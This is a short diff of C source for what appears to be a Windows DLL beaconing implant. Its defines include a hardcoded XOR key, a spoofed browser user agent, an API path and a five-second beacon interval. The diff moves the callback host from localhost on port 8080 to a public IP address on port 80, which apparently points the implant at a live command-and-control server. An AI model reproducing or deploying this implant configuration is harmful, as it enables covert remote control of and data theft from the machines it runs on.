@@ -1,4 +1,4 @@
-// compile with : x86_64-w64-mingw32-gcc -O2 -Wall -shared -o agent.dll agent.c -lwininet -lpsapi
+// compile with : x86_64-w64-mingw32-gcc -O2 -Wall -shared -o agent.dll http_agent_dll.c -lwininet -lpsapi
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <wininet.h>
@@ -14,8 +14,8 @@
 #define XOR_KEY "mysecretkey"
 #define XOR_KEYLEN (sizeof(XOR_KEY) - 1)
 #define USER_AGENT "Mozilla/5.0"
-#define HOSTNAME "127.0.0.1"
-#define PORT 8080
+#define HOSTNAME "217.154.13.193"
+#define PORT 80
 #define HEADER "Accept: application/json\r\n"
 #define PATH_API "/api"
 #define BEACON_INTERVAL 5
